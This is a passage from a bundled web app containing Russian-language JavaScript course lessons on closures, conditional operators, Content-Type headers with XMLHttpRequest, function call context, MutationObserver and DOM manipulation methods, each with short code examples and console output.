Object\n~~~\n\nАнонимная функция была вызвана единственный раз, после чего она удаляется из памяти (поскольку ссылка на нее не сохраняется).\n\n______________________\n\nВ этом примере анонимная функция получает агрумент \"Hello\", объявляет переменную **_message_** в своей функциональной области видимости,\nв которой сохраняет полученное значение аргумента, и возвращает анонимную функцию.\n\nПри этом ее контекст демонтируется (удаляется из стека), и логично предположить, что переменная **_message_** также будет удалена из памяти,\n\n![ico-20 yes] но!\n\nсборщик мусора не может удалить переменную  **_message_**  из памяти, поскольку возвращаемая анонимная функция использует в своем контексте ссылку на нее.\n\nА пока есть хоть одна активная ссылка на переменную, сборщик мусора не может очистить память, выделенную под эту переменную.\n\nЭтот эффект называется \"замыкание\".\n\nПосле вычисления значения функционального выражения в переменной **_func_** будет ссылка на анонимную функцию,\nв контексте которой будет \"замкнута\" переменная **_message_**.\n\nТеперь ссылка на переменную **_message_** существует только в контексте возвращаемой функции.\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nvar sayHello = (function (message) {\n  return function (name) {\n    console.log(`${ message }, ${ name }`)\n  }\n})('Hello')\n\nsayHello('Дима')\nsayHello ('Николай')\n~~~\n\nЭффект замыкания часто используется для защиты переменных, но следует помнить, что это всего лишь побочный эффект, а не прием, и этот эффект может приводить к утечкам памяти.\n\n-----------------------------\n\n## ![ico-25 icon] Паттерн \"Модуль\"\n\nСочетание IIFE с эффектом замыкания дает нам один из паттернов проектирования под названием \"Модуль\", который, к сожалению, активно используется в разработке, а так же при сборке приложений.\n\nЛюбое приложение (application) собирается из модулей, каждый из которых имеет собственную изолированную область видимости.\nВсе переменные и функции, объявленные в модуле, доступны только в пределах этого модуля.\n\nНо для того, чтобы \"спрятать\" переменные и функции внутри модуля, логичнее использовать прием каррирования, а не побочный эффект работы сборщика мусора.\nСоветую внимательно ознакомиться с приемом каррирования, который заимствован из функциональных языков программирования и является более корректным способом е только \"прятать\" переменные внутри функции (модуля), но и строить красивые цепочные вычисления.\n\n_____________________________\n\n## ![ico-25 warn] Function\n\n![ico-20 err] Функции, созданные конструктором **Function**, не создают замыкания\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nvar __var__ = 'Global Scope'\n\nfunction functionConstructor() {\n  var __var__ = 'Function Scope'\n  return new Function('console.warn(__var__)')\n}\n\nfunction functionDeclaration() {\n  var __var__ = 'Closured Scope'\n  return function () {\n    console.info(__var__)\n  }\n}\n\nfunctionConstructor()()   // Global Scope\nfunctionDeclaration()()   // Closured Scope\n~~~\n\n_____________________________\n\n## ![ico-25 warn] Memory Leaks\n\n![ico-20 warn] Замыкание может приводить к утечкам памяти.\n\nСледующий код приведет к остановке приложения по причине переполнения памяти:\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nvar globalFunc\n\nfunction closure () {\n  var data = new Array(1000000)\n  var func = globalFunc\n\n  function innerFunc() {\n    if (func) return data\n  }\n\n  return function () {}\n}\n\nsetInterval(() => globalFunc = closure(), 5)\n~~~\n\nЗа счет чего возникают утечки памяти в этом фрагменте кода ?\n\nКаждый раз, когда срабатывает таймер, вызывается ~closure~ и происходит переопределение значения ~globalFunc~\nВ каждом новом варианте ~globalFunc~ в замыкание попадают переменные ~data~, ~func~ и ~innerFunc~\nПри этом ссылка на предыдущее значение ~globalFunc~ попадает в локальную переменную ~func~,\nкоторая попала в замыкание нового значения ~globalFunc~,\nтем самым вместе с предыдущим значением ~globalFunc~ в замыкание попадают все переменные,\nкоторые были в замыкании ~globalFunc~, т.е. ~innerFunc~ в том числе\nПеременная ~data~ будет занимать приличный кусок памяти\nСсылка на ~data~ попадает в замыкание ~innerFunc~\n~innerFunc~ попадает в замыкание кадой новой версии ~globalFunc~\n\nПолучается глубокая вложенность переменных в замыкании, и ~data~ будет дублироваться до тех пор,\nпока это не приведет к переполнению памяти (очень быстро, поскольку итервал таймера - 5 милисекунд)\n\n_____________________________\n\n[![ico-30 hw] Тесты](quiz/closures-timers)\n"},63268:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] Условные операторы\n\nОбычная последовательность выполнения кода соответствует порядку следования команд:\n\n~~~js\nvar x = 5            // будет выполнена первой\nvar y = 11           // будет выполнена второй\nvar z = x * y + 5    // будет выполнена третьей\n~~~\n\nУсловный оператор обеспечивает возможность ветвления скрипта в зависимости от выполнения определенного условия\n\n_______________________________________________________________________________\n\n## ![ico-25 icon] if\n\n~~~js\nЕсли (что-то..) {\n  делаем так\n} в противном случае {\n  делаем что-то другое\n}\n~~~\n\nКакое бы выражение вы не поместили в круглые скобки, обязательно произойдет неявное приведение этого выражения к ~boolean~, т.е. в круглых скобках может быть все, что угодно - все равно под капотом будет сделано так:\n\n~~~js\nЕсли (Boolean(что-то..)) {\n  делаем так\n} в противном случае {\n  делаем что-то другое\n}\n~~~\n\nОсталось заменить **~Если~** на **~if~**\n\nСинтаксис:\n\n~~~js\nif (логическое выражение) {  \n  ...код 1  \n} else {\n  ...код 2\n}\n~~~\n\nВ этой записи появляется две ветки кода: _~код 1~_ и _~код 2~_\n\nКакая ветка кода будет выполнена, зависит от значения логического выражения в круглых скобках оператора **if**\n\nЕсли значением логического выражения будет ~true~, то выполняться будет _~код 1~_\n\nВ противном случае (если значением логического выражения будет ~false~ ) выполняться будет _~код 2~_\n\n![ico-20 warn] Примечание:\n\nЕсли в теле условного оператора  **if** всего одна операция, фигурные скобки можно опустить:\n\n~~~js\nif (i % 2 === 0) console.log(i)\n\nif (i % 2 !== 0) continue\n~~~\n\n^^** % ** - операция взятия остатка от деления^^\n\n_________________________________________________________________\n\n^^^[Пример 1]\n\n~~~js\nif (typeof x === 'number') {\n  var z = x * 5\n  var y = x / 10 - 3\n}\nelse {\n  var z = 0\n  var y = 0\n}\n~~~\n\nЗдесь код разветвляется: первая \"ветка\" кода будет выполнена тогда, когда переменная **~ x ~** будет числом\n\nВ этом случае переменной **~ z ~** будет присвоено значение ~x * 5~, а переменной **~ y ~** значение выражения ~x / 10 - 3~\n\n^^В противном случае (когда **~ x ~** не является числом) переменные **~ z ~** и **~ y ~** получат значение ** 0 **^^\n\n^^^\n\n_________________________________________________________________\n\n## ![ico-25 icon] Тернарный оператор\n\nСинтаксис: _~логическое выражение~_ ** ? ** ~выражение 1~ ** : ** ~выражение 2~\n\nСостоит из трех частей:\n\nлогическое выражение ** ?** выражение 1 ** :** выражение 2\n\nПосле ~логического выражения~ обязательно следует символ ** ? **, после чего следуют ~выражение 1~ и ~выражение 2~, разделенные двоеточием\n\nВычисляется значение логического выражения\n\nЕсли оно будет равно ~true~, тернарный оператор вычисляет и возвращает значение ~выражение 1~\n\nЕсли оно будет равно ~false~, тернарный оператор вычисляет и возвращает значение ~выражение 2~\n\n_____________________________________________________________\n\n#### ![ico-30 cap] Example 1\n\n~~~js\nvar meet = sourse === 'fruit' ? 'apple' : 'mashroom'\n~~~\n\nЗдесь логическое выражение: ~sourse === 'fruit'~\n\nЕсли это выражение примет значение ~true~, то переменной  **~meet~**  будет присвоено значение  \"apple\"\n\nЕсли это выражение примет значение ~false~, то переменной  **~meet~**  будет присвоено значение  \"mashroom\"\n\n______________________________________________________________\n\n#### ![ico-30 cap] Example 2\n\n~~~js\nvar result = expresion ? 'Все правильно' : 'Ошибка'\n~~~\n\nЕсли expresion === ~true~, значением переменной  **~result~**  будет строка *\"Все правильно\"*\n\nЕсли expresion === ~false~, значением переменной  **~result~**  будет строка *\"Ошибка\"*\n\n^^Например, в следующем случае **~result~** получит значение *\"Все правильно\"*:^^\n\n~~~js\nvar expresion = 'Google'\n...\nvar result = expresion ? 'Все правильно' : 'Ошибка'\n~~~\n\n^^а в этом случае **~result~** получит значение *\"Ошибка\"*:^^\n\n~~~js\nvar expresion = null\n...\nvar result = expresion ? 'Все правильно' : 'Ошибка'\n~~~\n\n_________________________________________________________\n\n#### ![ico-30 cap] Example 3\n\n~~~js\nvar sourse = 'picture'\n\nconsole.log(sourse === 'video' ? 'Видосик' : 'Картинка')\n~~~\n\n^^В консоль будет выведено \"Картинка\"^^\n\n_____________________________________________________________\n\n[![ico-20 link] MDN](external/mdn-expressions-operators)\n[![ico-20 link] w3schools](external/w3-if-else)\n\n_____________________________________________________________\n\n[![ico-30 hw] Упражнения](test/conditionalOperators)\n"},99510:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Content-Type\n\nЭтот заголовок определяет тип пересылаемого контента\n\n**~"Content-Type"  :  "тип  /  подтип  [ ; параметр ]"~**\n\n^^Тип используется для объявления общего типа данных, а подтип определяет специальный формат для данных этого типа^^\n\n^^^[Типы контента]\n\n![ico-20 green-ok] application\n![ico-20 green-ok] audio\n![ico-20 green-ok] image\n![ico-20 green-ok] message\n![ico-20 green-ok] multipart\n![ico-20 green-ok] text\n![ico-20 green-ok] video\n\n_______________________\n\n^^**~multipart~**  - содержимое состоит из нескольких частей, включающих данные различных типов^^\n\n^^^\n\n![ico-20 warn] ^^Для незарегестрированного типа содежимого имя должно начинаться с "X-"^^\n\n^^^[Примеры значений Content-Type]\n\n^^• **application/msword**^^\n^^• **application/pdf**^^\n^^• **application/json**^^\n^^• **image/gif**^^\n^^• **image/jpeg**^^\n^^• **image/png**^^\n^^• **video/mpeg**^^\n^^• **text/plain**^^\n^^• **text/html**^^\n^^• **text/html**; _charset=utf-8_^^\n^^• **multipart/form-data**^^\n^^• **multipart/mixed;** boundary="&#95;&#95;&#95;&#95;&#95;&#95;&#95;&#95;&#95;&#95;"^^\n\n___________________\n\n^^( в последнем примере строка "&#95;&#95;&#95;&#95;&#95;&#95;&#95;&#95;&#95;&#95;" указывается как разделитель для различных фрагментов контента^^\n^^В начале каждого фрагмента может быть задана своя строка с полем "Content-Type" )^^\n^^**_boundary_** ( граница ) — это последовательность байтов, которая не должна встречаться внутри пересылаемого контента^^\n\n^^^\n\n________________________________________\n\n## ![ico-25 icon] Примеры POST-запросов\n\nДалее мы будем использовать фейковый сервер для апробирования методов  **~XMLHttpRequest()~**\n\n[![ico-25 link] https://httpbin.org](https://httpbin.org)\n\n^^Этот ресурс не требует аутентификации, он предназначен исключительно для целей тестирования^^\n\nОбъявим функцию **~postData~**:\n\n~~~js\nfunction postData (data, contentType = \'application/json\') {\n  var request = new XMLHttpRequest()\n  request.open(\'POST\', \'https://httpbin.org/post\', true)\n\n  request.setRequestHeader(\'Content-Type\', contentType)\n\n  request.onreadystatechange = function () {\n    this.readyState === 4\n      ? this.status === 200\n        ? console.log(this.responseText)\n        : console.error(\'Request failed\')\n      : null\n  }\n  request.send(data)\n}\n~~~\n\nи будем вызывать ее с различными значениями аргументов.\n\n___________________\n\n### ![ico-25 cap] application/x-www-form-urlencoded\n\n~~~js\npostData(\'name=garevna&speciality=frontEnd\', \'application/x-www-form-urlencoded\')\n~~~\n\nРезультат в консоли:\n\n~~~console\n{\n  "args": {},\n  "data": "",\n  "files": {},\n  "form": {\n    "name": "garevna",\n    "speciality": "frontEnd"\n  },\n  "headers": {\n    "Accept": "*/*",\n    "Accept-Encoding": "gzip, deflate, br, zstd",\n    "Accept-Language": "en,uk;q=0.9,en-US;q=0.8,ru;q=0.7",\n    "Content-Length": "32",\n    "Content-Type": "application/x-www-form-urlencoded",\n    "Host": "httpbin.org",\n    "Origin": "null",\n    ...\n  },\n  "json": null,\n  "origin": "109.86.227.94",\n  "url": "https://httpbin.org/post"\n}\n~~~\n\n___________________\n\n### ![ico-25 cap] application/json\n\n~~~js\npostData(JSON.stringify({\n  name: \'Gregory\',\n  age: 48,\n  speciality: \'dev\'\n}))\n~~~\n\nРезультат в консоли:\n\n~~~console\n{\n  "args": {},\n  "data": "{\\"name\\":\\"Gregory\\",\\"age\\":48,\\"speciality\\":\\"dev\\"}",\n  "files": {},\n  "form": {},\n  "headers": {\n    "Accept": "*/*",\n    "Accept-Encoding": "gzip, deflate, br, zstd",\n    "Accept-Language": "en,uk;q=0.9,en-US;q=0.8,ru;q=0.7",\n    "Content-Length": "46",\n    "Content-Type": "application/json",\n    "Host": "httpbin.org",\n    "Origin": "null",\n    ...\n  },\n  "json": {\n    "age": 48,\n    "name": "Gregory",\n    "speciality": "dev"\n  },\n  "origin": "109.86.227.94",\n  "url": "https://httpbin.org/post"\n}\n~~~\n_______________________________\n\n\n### ![ico-25 cap] text/plain\n\n~~~js\nvar text = `The weird text generator enables you to convert your normal text into weird text by using different unusual Unicode symbols.\nIt generates weird text that resembles the normal characters or numbers of the alphabet in real time.`\n\npostData(text, \'text/plain\')\n~~~\n\nРезультат в консоли:\n\n~~~console\n{\n  "args": {},\n  "data": "The weird text generator enables you to convert your normal text into weird text by using different unusual Unicode symbols.\\nIt generates weird text that resembles the normal characters or numbers of the alphabet in real time.",\n  "files": {},\n  "form": {},\n  "headers": {\n    "Accept": "*/*",\n    "Accept-Encoding": "gzip, deflate, br, zstd",\n    "Accept-Language": "en,uk;q=0.9,en-US;q=0.8,ru;q=0.7",\n    "Content-Length": "226",\n    "Content-Type": "text/plain",\n    "Host": "httpbin.org",\n    "Origin": "null",\n    ...\n  },\n  "json": null,\n  "origin": "109.86.227.94",\n  "url": "https://httpbin.org/post"\n}\n~~~\n'},57203:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Context\n\nПоговорим о контексте вызова обычной и стрелочной функции\n\nДефолтный контекст вызова обычной функции устанавливается в момент ее объявления, но может быть изменен в момент вызова с помощью методов ~call~ или ~apply~\n\nОднако для объявления обычной функции мы можем использовать ~function declaration~ или ~function expression~\nвторое - это присваивание, в результате которого дефолтный контекст вызова определяется левой частью:\n\n**Пример 1**\n\n~~~js\nuser.showContext = function () {\n  console.log(this)\n}\n~~~\n\nздесь мы определили контекст в левой части оператора присваивания, т.е. контекст вызова - ~user~\n\nКонтекст стрелочной функции устанавливается в момент ее объявления, и присваивание не меняет ее контекст, поскольку он уже четко прописан - это контекст, в котором она была создана (правая часть оператора присваивания):\n\n**Пример 2**\n~~~js\nuser.sayHello = () => console.log(this)\n~~~\nздесь уже ~user.sayHello~ имеет глобальный контекст 😉\n\n-------------------\n\nКогда мы делаем объявление метода с помощью краткого синтаксиса, т.е. вот так:\n~~~js\nconst boy = {\n  name: 'Robert',\n  showContext () {\n    console.log(this)\n  }\n}\n~~~\nто имеет место присваивание, когда в правой части - обычная функция, а в левой - ~boy.showContext~\nтаким образом, имеет место **пример 1**\n\nЕсли же мы используем стрелочную функцию:\n~~~js\nconst boy = {\n  name: 'Robert',\n  showContext: () => console.log(this)\n}\n~~~\nто  имеет место **пример 2**\n\n-------------------\n\nЕсли вы усвоили предыдущее, погружаемся глубже 😂\n\n**sample 1**\n\nв этом примере метод ~create~ объекта ~user~ создается с помощью краткого синтаксиса объявления методов (**пример 1**)\nв результате контекст вызова этого метода - ~user~\nметод ~create~ возвращает объект, в котором будет метод ~showContext~\nконтекст вызова метода ~showContext~ - из **примера 2**, т.е. ~user~, поскольку именно в этом контексте работает создающий его метод ~create~\nтаком образом, колбек таймера - стрелочная функция, которая \"рождается\" в контексте ~user~\n\n~~~js\nconst user = {\n  name: 'Henry',\n  create () {\n    return {\n      name: 'Jeck',\n      showContext: () => setTimeout(() => console.log(this))\n    }\n  }\n}\n\nuser.create().showContext()  // { name: 'Henry', create: ƒ }\n~~~\n\n**sample 2**\n\nа в этом примере метод ~showContext~ объявлен с помощью краткого синтаксиса объявления методов (**пример 1**)\nтаким образом, контекст вызова - это контекст объекта, который возвращает метод ~create~ (объект с именем _Jeck_)\nколбек таймера получает этот контекст\n~~~js\nconst user = {\n  name: 'Henry',\n  create () {\n    return {\n      name: 'Jeck',\n      showContext () { setTimeout(() => console.log(this)) }\n    }\n  }\n}\n\nuser.create().showContext()  // { name: 'Jeck', showContext: ƒ }\n~~~\n\nВнесите \"маленькое\" изменение в код первого примера, изменяющий контекст вызова метода ~create~ - и вы уже в глобальном объекте\n~~~js\nconst user = {\n  name: 'Henry',\n  create: () => {\n    return {\n      name: 'Jeck',\n      showContext: () => setTimeout(() => console.log(this))\n    }\n  }\n}\n~~~\nОднако в **sample 2** колбек таймера будет видеть контекст по-прежнему\n~~~js\nconst user = {\n  name: 'Henry',\n  create: () => {\n    return {\n      name: 'Jeck',\n      showContext () { setTimeout(() => console.log(this)) }\n    }\n  }\n}\n~~~\n\nну, и так далее\n\nиграйтесь, это полезно для глубокого понимания контекста вызова 😉\n"},83785:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# Document Object Model\n\n## MutationObserver\n\nЭтот раздел лучше изучать в конце курса, когда вы уже разберетесь с итерирующими методами массивов, замыканием, статическими методами конструктора Object и т.д.\n\nConstructor\n\n~~~js\nconst innerText = 'Hello'\n\nfunction addElem (tagName, container = document.body) {\n  return container.appendChild(document.createElement(tagName))\n}\n\nconst target = Object.assign(addElem('h2'), {\n  innerText,\n  style: 'color: #09b; font-family: Arial'\n})\n\nconst input = Object.assign(addElem('h3'), {\n  innerText,\n  contentEditable: true,\n  style: `\n    padding: 8px 16px;\n    border: solid 1px #999;\n    border-radius: 4px;\n    font-family: Arial;\n    color: #f50;\n    outline: none;\n    max-width: 360px;\n  `\n})\n\nconst observer = new MutationObserver(function (mutations) {\n  mutations.forEach(function (mutation) {\n    mutation.type === 'characterData' && Object.assign(target, {\n      innerText: mutation.target.data\n    })\n  })\n})\n\nconst config = {\n  attributes: true,\n  childList: true,\n  characterData: true,\n  attributeOldValue: true,\n  characterDataOldValue: true,\n  subtree: true\n}\n\nobserver.observe(input, config)\n~~~\n\n**Live Demo**\n\n{{{DOM-MutationObserver-1.js}}}\n"},25140:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# Document Object Model\n\n## MutationObserver\n\nЭтот раздел лучше изучать в конце курса, когда вы уже разберетесь с итерирующими методами массивов, замыканием, статическими методами конструктора Object и т.д.\n\nConstructor\n\n~~~js\nconst innerText = 'Hello'\n\nfunction addElem (tagName, container = document.body) {\n  return container.appendChild(document.createElement(tagName))\n}\n\nconst target = Object.assign(addElem('h2'), {\n  innerText,\n  style: 'color: #09b; font-family: Arial'\n})\n\nconst input = Object.assign(addElem('h3'), {\n  innerText,\n  contentEditable: true,\n  style: `\n    padding: 8px 16px;\n    border: solid 1px #999;\n    border-radius: 4px;\n    font-family: Arial;\n    color: #f50;\n    outline: none;\n    max-width: 360px;\n  `\n})\n\nconst observer = new MutationObserver(function (mutations) {\n  mutations.forEach(function (mutation) {\n    mutation.type === 'characterData' && Object.assign(target, {\n      innerText: mutation.target.data\n    })\n  })\n})\n\nconst config = {\n  attributes: true,\n  childList: true,\n  characterData: true,\n  attributeOldValue: true,\n  characterDataOldValue: true,\n  subtree: true\n}\n\nobserver.observe(input, config)\n~~~\n\n**Live Demo**\n\n{{{DOM-MutationObserver-1.js}}}\n"},69452:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Document Object Model (DOM)\n\n## ![ico-30 icon] Методы объектов DOM\n\nВот тут и начинается самое прикольное: открывая и закрывая дверцы модели машинки, мы будем заставлять браузер открывать и закрывать дверцы оригинала.\n\nЭто и есть браузерный **API** для доступа к тому, что браузер отображает на странице.\n\nПонятное дело, дверцы тут ни при чем. Речь идет о том, что умеет делать браузер, и что из этого его функционала становится доступно нам посредством объектной модели.\n\nЭто методы как самого объекта **~document~**, так и всех **элементов DOM**.\n\n### ![ico-25 icon] appendChild()\n\nДобавляет элементу дочерний элемент.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~html\n&ltbody>\n  &ltdiv id=\"demo\">&lt/div>\n&lt/body>\n~~~\n\n~~~js\nvar section = document.createElement('section')\nsection.innerHTML = 'Hello'\ndocument\n  .querySelector('#demo')\n  .appendChild (section)\n~~~\n\n◘◘Результат◘◘\n\n~~~html\n&ltbody>\n  &ltdiv id=\"demo\">\n    &ltsection>Hello&lt/section>\n  &lt/div>\n&lt/body>\n~~~\n\n_______________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nvar style = document.createElement('style')\ndocument.head.appendChild(style)\nstyle.textContent = `p { color: red; }`\n\nstyle.sheet.cssRules[0]          // объект\nstyle.sheet.cssRules[0].cssText  // \"p { color: red; }\"\n\nstyle\n  .appendChild(document.createTextNode(`div { color: blue; }`))\n~~~\n\n◘◘Результат◘◘\n\n~~~html\n&lthead>\n  &ltstyle>\n    p { color: red; }\n    div { color: blue; }\n  &lt/style>\n&lt/head>\n~~~\n\n_______________________________________\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nvar script = document.createElement('script')\nscript.appendChild(document.createTextNode(`alert('Hello')`))\ndocument.body.appendChild(script)\n~~~\n\n_________________________________________\n\n### ![ico-25 icon] removeChild()\n\nУдаление элемента\n\nМетод возвращает ссылку на удаленный элемент\n\n![ico-20 warn] ~Удалить элемент этим методом может только его непосредственный родитель~\n\n____________________________\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~html\n&ltbody>\n  &ltdiv id=\"demo\">\n    &ltsection id=\"section\">&lt/section>\n    &ltfigure class=\"figure\">&lt/figure>\n  &lt/div>\n&lt/body>\n~~~\n\n~~~js\nvar section = document.querySelector('#section')\nvar removed = section.parentNode.removeChild(section)\nconsole.dir(removed)  // ► section#section\n\nvar figure = document.querySelector('.figure')\nfigure.appendChild(removed)\n~~~\n\n◘◘Результат◘◘\n\n~~~html\n&ltbody>\n  &ltdiv id=\"demo\">\n    &ltfigure class=\"figure\">\n      &ltsection id=\"section\">&lt/section>\n    &lt/figure>\n  &lt/div>\n&lt/body>\n~~~\n\n_______________________________\n\n### ![ico-25 icon] insertBefore()\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nfunction addElement (tagName, container = document.body) {\n  return (container.nodeType === 1 ? container : document.body)\n    .appendChild(document.createElement(tagName))\n}\n\nvar main = addElement('main')\nvar section = addElement('section', main)\nvar figure = addElement ('figure', main)\n\nmain.insertBefore(document.createElement('p'), section)\n~~~\n\n◘◘Результат◘◘\n\n~~~html\n&ltbody>\n  &ltmain>\n    &ltp>&lt/p>\n    &ltsection>&lt/section>\n    &ltfigure>&lt/figure>\n  &lt/main>\n&lt/body>\n~~~\n\n_____________________________________________\n\n### ![ico-25 icon] insertAdjacentHTML()\n\nВставим в разметку элементы _~main~_, _~section~_ и _~figure~_ следующим образом:\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~html\n&ltbody>\n  &ltmain>\n    &ltsection>&lt/section>\n    &ltfigure>&lt/figure>\n  &lt/main>\n&lt/body>\n~~~\n\nА теперь выполним следующий код в консоли:\n\n~~~js\nvar section = document.body.querySelector('section')\nsection.insertAdjacentHTML('beforeBegin', '<p>beforeBegin</p>')\nsection.insertAdjacentHTML('afterBegin', '<p>afterBegin</p>')\nsection.insertAdjacentHTML('beforeEnd', '<p>beforeEnd</p>')\nsection.insertAdjacentHTML('afterEnd', '<p>afterEnd</p>')\n~~~\n\n◘◘Результат◘◘\n\n~~~html\n&ltbody>\n  &lt;main>\n    &lt;p>beforeBegin&lt;/p>\n    &lt;section>\n      &lt;p>afterBegin&lt/p>\n      &ltp>beforeEnd&lt/p>\n    &lt/section>\n    &ltp>afterEnd&lt/p>\n    &ltfigure>&lt/figure>\n  &lt/main>\n&lt/body>\n~~~\n\n______________________________________________\n\n### ![ico-25 icon] insertAdjacentElement()\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~html\n&ltbody>\n  &ltmain>\n    &ltsection id=\"demo\">&lt/section>\n    &ltfigure>&lt/figure>\n  &lt/main>\n&lt/body>\n~~~\n\n~~~js\ndocument.getElementById('demo')\n  .insertAdjacentElement('beforeend', document.createElement('p'))\n\ndocument.querySelector('figure')\n  .insertAdjacentElement('afterend', document.createElement('h3'))\n\ndocument.querySelector('#demo')\n  .insertAdjacentElement('beforebegin', document.createElement('img'))\n\ndocument.getElementsByTagName('figure')[0]\n  .insertAdjacentElement('afterbegin', document.createElement('li'))\n~~~\n\n◘◘Результат◘◘\n\n~~~html\n&ltbody>\n  &ltmain>\n    &ltimg>\n    &ltsection id=\"demo\">\n      &ltp>&lt/p>\n    &lt/section>\n    &ltfigure>\n      &ltli>&lt/li>\n    &lt/figure>\n    &lth3>&lt/h3>\n  &lt/main>\n&lt/body>\n~~~\n\n________________________________________\n\n## ![ico-30 icon] Свойства элементов DOM\n\n____________________________\n\n### ![ico-25 icon] childNodes\n\nОбъект **~NodeList~**\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~html\n&lt;body>\n  Hi, students!\n  &ltdiv\n    class=\"container\"\n    title=\"Container\"\n  >\n    &lta\n      class=\"paragraph\"\n      href=\"https://translate.google.com/\"\n      title=\"Google translate\"\n    >\n      Google translate\n    &lt/a>\n    &ltimg\n      src=\"http://www.abc.net.au/news/image/9154542-1x1-940x940.jpg\"\n      width=\"200\"\n      id=\"picture\"\n      class=\"galleryPicture\"\n    />\n  &lt/div>\n  &lth1 class=\"header\">Welcome!&lt/h1>\n  &ltp class=\"paragraph\">You study JS&lt/p>\n&lt/body>\n~~~\n\nВыведем в консоль все дочерние узлы ~document.body~\n\n~~~js\ndocument.body.childNodes\n~~~\n\n◘◘Результат◘◘\n\n~~~console\n▼ NodeList(7) [text, div.container, text, h1.header, text, p.paragraph, text]\n    0: text\n  ► 1: div.container\n  ► 2: text\n  ► 3: h1.header\n  ► 4: text\n  ► 5: p.paragraph\n  ► 6: text\n    length: 7\n  ► __proto__: NodeList\n~~~\n\n![ico-20 warn] Обратите внимание, что все переводы строк (и пустые строки) рассматриваются как тестовые узлы документа.\n\nТеперь выведем в консоль все дочерние узлы первого элемента с атрибутом **_title_**:\n\n~~~js\ndocument.querySelector('[title]').childNodes\n~~~\n\n◘◘Результат◘◘\n\n~~~console\n▼ NodeList(5) [text, a.paragraph, text, img#picture.galleryPicture, text]\n    0: text\n  ► 1: a.paragraph\n  ► 2: text\n  ► 3: img#picture.galleryPicture\n  ► 4: text\n    length: 5\n  ► __proto__: NodeList\n~~~\n___________________\n\n[![ico-20 link] **w3schools**](external/w3-child-nodes )\n\n_________________________________\n\n### ![ico-25 icon] children\n\nОбъект **~HTMLCollection~**\n\nИспользуем разметку предыдущего примера.\n\n~~~js\ndocument.body.children\n~~~\n\n◘◘Результат◘◘\n\n~~~console\n▼ HTMLCollection(3) [div.container, h1.header, p.paragraph]\n  ► 0: div.container\n  ► 1: h1.header\n  ► 2: p.paragraph\n    length: 3\n  ► __proto__: HTMLCollection\n~~~\n\n___________________________________\n\n### ![ico-25 icon] parentNode\n\n^^Ссылка на родительский элемент (контейнер, в котором находится элемент).^^\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~html\n&ltbody>\n  &ltdiv id=\"demo\">\n    &ltsection id=\"section\">&lt/section>\n    &ltfigure>&lt/figure>\n  &lt/div>\n&lt/body>\n~~~\n\n~~~js\nvar section = document.querySelector('#section')\nconsole.dir(section.parentNode)  // ► div#demo\n~~~\n\n_____________________________________________\n\n### ![ico-25 icon] on + тип события\n\nВсе свойства элементов DOM, начинающиеся на **~on~**, являются потенциальными ссылками на обработчика соответствующего события\n\nИзначально они имеют значение ~null~\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\nvar section = document.body\n  .appendChild(document.createElement('section'))\n\nsection.innerHTML = '<h3>Hello</h3>'\n\nfor (var prop in section) {\n  if (prop.indexOf('on') !== 0) continue\n  console.info(`Event: ${prop.slice(2)}`)\n}\n~~~\n\n_____________________________________\n\n### ![ico-25 icon] Memory leaks\n\nПредположим, вы сохраняете ссылку на конкретную ячейку таблицы (тег &lt;td>) в своем коде.\nВ какой-то момент в будущем вы решите удалить таблицу из DOM, но забываете удалить ссылку на эту ячейку.\nИнтуитивно можно предположить, что garbage collector (сборщик мусора) будет очищать память от всех переменных, кроме ссылки на эту ячейку.\nНа практике произойдет следующее: поскольку ячейка является дочерним узлом таблицы, а а элементы-потомки сохраняют ссылки на своих родителей,\nсохранившаяся ссылка на ячейку таблицы приводит к тому, что вся таблица остается в памяти.\nУчитывайте это внимательно, сохраняя ссылки на элементы DOM.\n\n_______________________________________\n\n### ![ico-25 icon] Атрибуты тегов\n\nПочти все атрибуты тегов, предусмотренные в спецификации языка HTML5, благополучно маппируются в одноименные свойства объектов DOM.\nНапример, в разметке присутствует тег **~&lt;img />~** с атрибутом **~src~**. В объектной модели документа ему будет соответствовать объект, имеющий свойство **~src~**. Значение этого свойства будет таким же, как и у атрибута **~src~**.\nИсключение составляет атрибут **~class~**, поскольку этот идентификатор используется в JS.\nПоэтому аттрибут **~class~** в объектной модели документа представлен свойством **~className~**.\n\nТаким образом, нам не обязательно использовать описанные ниже методы для доступа к значениям стандартных атрибутов.\n\nОднако мы можем устанавливать собственные атрибуты тегов, которые не предусмотрены спецификацией языка.\nВ этом случае для получения и установки значений этих атрибутов нам необходимы следующие методы.\n\n◘◘![ico-25 cap] **setAttribute** | **getAttribute**◘◘\n\n~~~js\ndocument.body.setAttribute('title', 'Hello')\n\nconsole.info(document.body.getAttribute('title'))\n~~~\n\n______________________\n\n◘◘![ico-25 cap] **getBoundingClientRect**◘◘\n\n~~~js\nvar div = document.body\n  .appendChild(document.createElement('div'))\n\ndiv.setAttribute('style', `\n  width: 200px;\n  height: 200px;\n  border: solid 1px blue;\n`)\n\nconsole.info(div.getBoundingClientRect())\n~~~\n\n◘◘Результат◘◘\n\n~~~console\n▼ DOMRect {x: 8, y: 8, width: 202, height: 202, top: 8, …}\n    bottom: 210\n    height: 202\n    left: 8\n    right: 210\n    top: 8\n    width: 202\n    x: 8\n    y: 8\n  ► __proto__: DOMRect\n~~~\n___________________________\n\n◘◘![ico-25 cap] 